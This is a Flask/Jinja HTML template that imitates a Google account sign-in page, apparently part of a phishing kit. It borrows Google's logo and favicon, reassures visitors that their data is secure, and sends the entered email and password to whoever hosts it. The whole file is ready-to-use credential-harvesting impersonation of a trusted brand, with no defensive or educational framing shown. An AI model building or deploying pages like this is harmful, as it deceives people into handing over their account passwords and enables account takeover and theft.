{%extends 'base.html'%}

{%block title%} Google Login {%endblock%}

{%block link%}
<link rel="icon" href="{{ url_for('static', filename = 'favicon/google.ico') }}" type="image/icon type">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
<link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
{%endblock%}

{%block content%}
<h2>Google Account</h2>
<img class="google" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" alt="googles" srcset="">
<form class="form-inline" method="POST">
    <div class="form-group">
      <div class="inputBox">
        <input type="email" name="email" value="">
        <label>Username</label>
      </div>
    </div>
    <div class="form-group">
      <div class="inputBox">
        <input type="password" name="pwd" value="">
        <label>Password</label>
      </div>
    </div>
    <p class="spam">Your Data will be secure And We're not a spam</p>
    <div class="checkbox">
      <label class="RM">
        <input type="checkbox"> Remember me
      </label>
    </div>
    <button type="submit" name="sign-in" value="Sign In" class="btn btn-primary">Sign In</button>
  </form>
{%endblock%}
